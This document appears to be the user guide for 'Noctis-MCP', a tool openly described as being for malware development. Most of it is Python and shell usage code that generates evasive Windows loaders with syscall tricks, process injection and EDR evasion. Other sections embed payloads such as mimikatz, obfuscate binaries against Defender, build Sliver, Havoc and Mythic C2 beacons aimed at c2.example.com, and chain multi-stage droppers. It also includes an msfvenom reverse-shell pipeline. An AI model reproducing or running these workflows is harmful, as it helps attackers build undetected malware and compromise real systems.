# User Guide

Complete guide to using Noctis-MCP for malware development.

## Table of Contents

1. [Basic Concepts](#basic-concepts)
2. [Technique Selection](#technique-selection)
3. [Code Generation](#code-generation)
4. [Compilation](#compilation)
5. [Obfuscation](#obfuscation)
6. [C2 Integration](#c2-integration)
7. [OPSEC Analysis](#opsec-analysis)
8. [Common Workflows](#common-workflows)

---

## Basic Concepts

### What is Noctis-MCP?

Noctis-MCP is a framework that:
1. **Indexes** malware techniques from real-world examples
2. **Assembles** compatible techniques into working code
3. **Compiles** code into Windows PE executables
4. **Integrates** with C2 frameworks (Sliver, Havoc, Mythic)
5. **Obfuscates** code to evade detection

### Core Workflow

```
Query Techniques → Select Compatible → Assemble Code → Apply Obfuscation → Compile → Deploy
```

### Technique IDs

Each technique has a unique ID:
- `NOCTIS-T001` - API Hashing (DJB2)
- `NOCTIS-T118` - String Encryption (AES)
- `NOCTIS-T124` - Indirect Syscalls (HellsHall)

Use these IDs to request specific techniques.

---

## Technique Selection

### Query All Techniques

**Python:**
```python
import requests

response = requests.get('http://localhost:5000/api/techniques')
techniques = response.json()['techniques']

for tech in techniques:
    print(f"{tech['technique_id']}: {tech['name']}")
```

**CLI:**
```bash
curl http://localhost:5000/api/techniques | jq '.techniques[] | "\(.technique_id): \(.name)"'
```

### Query by Category

```python
response = requests.get('http://localhost:5000/api/techniques', params={
    'category': 'api_hashing'
})
```

Categories:
- `api_hashing` - API obfuscation techniques
- `syscalls` - Direct syscall methods
- `injection` - Code injection techniques
- `encryption` - Payload encryption
- `steganography` - Data hiding
- `persistence` - Persistence mechanisms
- `unhooking` - EDR unhooking

### Query by MITRE ATT&CK

```python
response = requests.get('http://localhost:5000/api/techniques', params={
    'mitre_ttp': 'T1055'  # Process Injection
})
```

### Get Technique Details

```python
tech_id = "NOCTIS-T124"
response = requests.get(f'http://localhost:5000/api/techniques/{tech_id}')
details = response.json()

print(f"Name: {details['name']}")
print(f"Category: {details['category']}")
print(f"OPSEC Risk: {details['opsec']['detection_risk']}")
print(f"Compatible with: {details['compatible_with']}")
```

---

## Code Generation

### Generate Simple Loader

**Python:**
```python
import requests

response = requests.post('http://localhost:5000/api/generate', json={
    'techniques': ['NOCTIS-T124', 'NOCTIS-T118'],
    'target_os': 'Windows 11',
    'obfuscate': True
})

code = response.json()['code']
print(code)
```

### Generate with Specific Payload

```python
# Read payload (e.g., mimikatz)
with open('mimikatz.exe', 'rb') as f:
    payload = f.read()

# Generate loader with embedded payload
response = requests.post('http://localhost:5000/api/generate', json={
    'techniques': ['NOCTIS-T124', 'NOCTIS-T118', 'NOCTIS-T089'],
    'payload': payload.hex(),
    'payload_type': 'pe',
    'obfuscate': True
})
```

### Available Techniques by Function

**API Obfuscation:**
- NOCTIS-T001: DJB2 hashing
- NOCTIS-T002: ROT13+XOR hashing
- NOCTIS-T003: CRC32 hashing

**Syscalls:**
- NOCTIS-T124: HellsHall (indirect)
- NOCTIS-T125: Trap flag syscalls
- NOCTIS-T126: Direct syscalls

**Injection:**
- NOCTIS-T055: Process hollowing
- NOCTIS-T056: APC injection
- NOCTIS-T057: Thread pool injection
- NOCTIS-T089: RunPE

**Encryption:**
- NOCTIS-T118: AES encryption
- NOCTIS-T119: XOR encryption
- NOCTIS-T120: RC4 encryption

**Evasion:**
- NOCTIS-T201: GPU memory hiding
- NOCTIS-T202: Stack spoofing
- NOCTIS-T203: VEH manipulation

---

## Compilation

### Compile Code

**Basic Compilation:**
```python
response = requests.post('http://localhost:5000/api/compile', json={
    'source_code': code,
    'architecture': 'x64',
    'optimization': 'O2',
    'output_name': 'loader'
})

result = response.json()
print(f"Binary: {result['binary_path']}")
print(f"Size: {result['size']} bytes")
print(f"Time: {result['compilation_time']}s")
```

### Architecture Options

- `x64` - 64-bit (recommended)
- `x86` - 32-bit (legacy compatibility)

### Optimization Levels

- `O0` - No optimization (debugging)
- `O1` - Basic optimization
- `O2` - Full optimization (recommended)
- `O3` - Aggressive optimization (larger binary)

### Subsystem Options

- `console` - Console application (shows window)
- `windows` - GUI application (no console)

**Example:**
```python
response = requests.post('http://localhost:5000/api/compile', json={
    'source_code': code,
    'architecture': 'x64',
    'optimization': 'O2',
    'subsystem': 'windows',  # No console window
    'output_name': 'stealthy_loader'
})
```

---

## Obfuscation

### String Encryption

**Encrypt all strings in code:**
```python
from server.obfuscation.string_encryption import StringEncryptor

encryptor = StringEncryptor(method='aes')
encrypted_code = encryptor.encrypt_code(source_code)
```

**Methods:**
- `xor` - XOR with random key (fast)
- `aes` - AES-256 encryption (secure)
- `rc4` - RC4 encryption (balanced)

### API Hashing

**Hash API calls to hide imports:**
```python
from server.obfuscation.api_hashing import APIHasher

hasher = APIHasher(algorithm='djb2')
hashed_code = hasher.hash_apis(source_code)
```

**Algorithms:**
- `djb2` - DJB2 hash (common)
- `rot13xor` - ROT13 + XOR (custom)
- `crc32` - CRC32 hash (fast)

### Control Flow Flattening

**Make code harder to reverse engineer:**
```python
from server.obfuscation.control_flow import flatten_control_flow

flattened_code = flatten_control_flow(
    source_code,
    complexity='high'
)
```

### Polymorphic Code Generation

**Generate unique code variant:**
```python
from server.polymorphic.engine import PolymorphicEngine

engine = PolymorphicEngine()
variant, stats = engine.generate_variant(
    source_code=code,
    mutation_level='high'
)

print(f"Variables renamed: {stats['variables_renamed']}")
print(f"Functions reordered: {stats['functions_reordered']}")
```

**Mutation Levels:**
- `low` - Minor changes (10-20% different)
- `medium` - Moderate changes (30-50% different)
- `high` - Major changes (60-80% different)

### Combined Obfuscation

```python
# Full obfuscation pipeline
from server.obfuscation.string_encryption import StringEncryptor
from server.obfuscation.api_hashing import APIHasher
from server.polymorphic.engine import PolymorphicEngine

# 1. Encrypt strings
encryptor = StringEncryptor(method='aes')
code = encryptor.encrypt_code(source_code)

# 2. Hash APIs
hasher = APIHasher(algorithm='djb2')
code = hasher.hash_apis(code)

# 3. Polymorphic mutation
engine = PolymorphicEngine()
code, stats = engine.generate_variant(code, mutation_level='high')

# 4. Compile
response = requests.post('http://localhost:5000/api/compile', json={
    'source_code': code,
    'architecture': 'x64'
})
```

---

## C2 Integration

See **[C2_INTEGRATION.md](C2_INTEGRATION.md)** for complete C2 setup.

### Generate Sliver Beacon

```python
from c2_adapters import generate_sliver_beacon

result = generate_sliver_beacon(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124", "NOCTIS-T118"],
    obfuscate=True
)

print(f"Beacon: {result.beacon_path}")
print(f"Size: {result.beacon_size} bytes")
print(f"OPSEC: {result.opsec_score}/10")
```

### Generate Havoc Demon

```python
from c2_adapters import generate_havoc_demon

result = generate_havoc_demon(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    sleep_technique="Ekko",  # Advanced sleep obfuscation
    indirect_syscalls=True,
    stack_duplication=True,
    techniques=["NOCTIS-T124"],
    obfuscate=True
)
```

### Generate Mythic Agent

```python
from c2_adapters import generate_mythic_agent

result = generate_mythic_agent(
    listener_host="c2.example.com",
    listener_port=80,
    agent_type="apollo",
    c2_profile="http",
    api_token="your_mythic_api_token",
    techniques=["NOCTIS-T124"],
    obfuscate=True
)
```

---

## OPSEC Analysis

### Analyze Binary

```python
from server.opsec_analyzer import analyze_opsec

result = analyze_opsec(binary_path='loader.exe')

print(f"OPSEC Score: {result['score']}/10")
print("\nIssues found:")
for issue in result['issues']:
    print(f"- [{issue['severity']}] {issue['description']}")
    
print("\nRecommendations:")
for rec in result['recommendations']:
    print(f"- {rec}")
```

### OPSEC Scoring

**Score Breakdown:**
- **9-10**: Excellent OPSEC, hard to detect
- **7-8**: Good OPSEC, some minor issues
- **5-6**: Moderate OPSEC, several improvements needed
- **3-4**: Poor OPSEC, easily detected
- **0-2**: Critical issues, immediate detection likely

**Factors:**
- String analysis (API names, debug strings)
- Import table (exposed APIs)
- Entropy (unencrypted payloads)
- Known signatures
- Memory patterns

### Automatic Remediation

```python
# Analyze and get recommendations
result = analyze_opsec('loader.exe')

if result['score'] < 8:
    print("Applying OPSEC improvements...")
    
    # Re-obfuscate with recommended changes
    improved_code = apply_opsec_recommendations(
        source_code,
        result['recommendations']
    )
    
    # Recompile
    recompile(improved_code)
```

---

## Common Workflows

### Workflow 1: Simple Shellcode Loader

```python
# 1. Select techniques
techniques = ["NOCTIS-T124", "NOCTIS-T118"]

# 2. Generate code
response = requests.post('http://localhost:5000/api/generate', json={
    'techniques': techniques,
    'target_os': 'Windows 11',
    'obfuscate': True
})
code = response.json()['code']

# 3. Compile
response = requests.post('http://localhost:5000/api/compile', json={
    'source_code': code,
    'architecture': 'x64',
    'optimization': 'O2'
})

binary_path = response.json()['binary_path']
print(f"Loader ready: {binary_path}")
```

### Workflow 2: C2 Beacon with Obfuscation

```python
from c2_adapters import generate_sliver_beacon

# Generate beacon with full obfuscation
result = generate_sliver_beacon(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    architecture="x64",
    techniques=[
        "NOCTIS-T124",  # API hashing
        "NOCTIS-T118",  # String encryption
        "NOCTIS-T201"   # GPU hiding
    ],
    obfuscate=True
)

if result.success:
    print(f"Beacon: {result.beacon_path}")
    print(f"OPSEC: {result.opsec_score}/10")
    print(f"Techniques: {result.techniques_applied}")
```

### Workflow 3: Targeted Malware Development

```python
# For Windows 11 + Defender
techniques_win11_defender = [
    "NOCTIS-T124",  # API hashing
    "NOCTIS-T118",  # AES string encryption
    "NOCTIS-T125",  # Trap flag syscalls
    "NOCTIS-T201"   # GPU memory hiding
]

# Generate and compile
response = requests.post('http://localhost:5000/api/generate', json={
    'techniques': techniques_win11_defender,
    'target_os': 'Windows 11',
    'target_av': 'Windows Defender',
    'obfuscate': True
})

code = response.json()['code']

# Compile with high optimization
response = requests.post('http://localhost:5000/api/compile', json={
    'source_code': code,
    'architecture': 'x64',
    'optimization': 'O3',
    'subsystem': 'windows'
})

# Analyze OPSEC
binary = response.json()['binary_path']
opsec = analyze_opsec(binary)

if opsec['score'] >= 8:
    print(f"Ready for deployment: {binary}")
else:
    print(f"OPSEC score too low ({opsec['score']}), improving...")
```

### Workflow 4: Multi-Stage Payload

```python
# Stage 1: Minimal dropper
stage1_code = generate_code(['NOCTIS-T124'])  # Just API hashing
compile_code(stage1_code, output='dropper.exe')

# Stage 2: Full-featured loader
stage2_code = generate_code([
    'NOCTIS-T124', 'NOCTIS-T118', 'NOCTIS-T125', 'NOCTIS-T201'
])
compile_code(stage2_code, output='loader.dll')

# Stage 3: Final payload (C2 beacon)
beacon = generate_sliver_beacon(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    obfuscate=True
)

print("Multi-stage payload ready:")
print(f"  Dropper: dropper.exe")
print(f"  Loader: loader.dll")
print(f"  Beacon: {beacon.beacon_path}")
```

---

## Best Practices

### 1. Always Use Obfuscation

```python
# Good
result = generate_beacon(..., obfuscate=True)

# Bad
result = generate_beacon(..., obfuscate=False)
```

### 2. Check OPSEC Score

```python
if result.opsec_score < 7:
    print("Warning: Low OPSEC score")
    # Add more techniques or improve obfuscation
```

### 3. Test in Isolated Environment

```python
# Deploy to test VM first
deploy_to_vm('test-win11-vm', binary_path)

# Monitor for alerts
check_av_alerts()

# If clean, proceed to production
if no_alerts:
    deploy_to_target(binary_path)
```

### 4. Use Appropriate Techniques for Target

```python
# Windows 10
techniques_win10 = ['NOCTIS-T124', 'NOCTIS-T118']

# Windows 11 + EDR
techniques_win11_edr = ['NOCTIS-T124', 'NOCTIS-T125', 'NOCTIS-T201', 'NOCTIS-T202']
```

### 5. Beacon Interval Tuning

```python
# Active operation (frequent callbacks)
config = SliverConfig(
    listener_host="c2.example.com",
    beacon_interval=30,  # 30 seconds
    beacon_jitter=20     # 20% jitter
)

# Persistent (stealth)
config = SliverConfig(
    listener_host="c2.example.com",
    beacon_interval=3600,  # 1 hour
    beacon_jitter=80       # 80% jitter
)
```

---

## Troubleshooting

### Issue: Compilation Fails

**Check compiler installation:**
```bash
# Linux
x86_64-w64-mingw32-gcc --version

# Windows
msbuild -version
```

**Check source code syntax:**
```python
# Validate code before compilation
if validate_c_syntax(code):
    compile(code)
```

### Issue: Low OPSEC Score

**Analyze and improve:**
```python
result = analyze_opsec(binary)

for issue in result['issues']:
    if issue['type'] == 'suspicious_string':
        # Add string encryption
        code = encrypt_strings(code)
    elif issue['type'] == 'exposed_import':
        # Add API hashing
        code = hash_apis(code)

# Recompile
recompile(code)
```

### Issue: C2 Beacon Not Connecting

**Check configuration:**
```python
# Verify listener is active
sliver > jobs

# Test connectivity
telnet c2.example.com 443

# Check beacon configuration
print(beacon.config)
```

---

## Advanced Usage

### Custom Technique Development

See **[DEVELOPMENT.md](DEVELOPMENT.md)** for creating custom techniques.

### Batch Generation

```python
# Generate multiple variants
configs = [
    {'protocol': 'https', 'port': 443},
    {'protocol': 'dns', 'domain': 'example.com'},
    {'protocol': 'mtls', 'port': 8888}
]

for config in configs:
    beacon = generate_sliver_beacon(**config)
    print(f"Generated: {beacon.beacon_path}")
```

### Integration with Other Tools

```python
# Generate shellcode for Cobalt Strike
beacon = generate_sliver_beacon(..., output_format='shellcode')

# Use with Metasploit
msfvenom -p windows/x64/shell_reverse_tcp -f raw | \
    python noctis_wrapper.py --obfuscate
```

---

**Last Updated**: October 3, 2025  
**Version**: 1.0.0

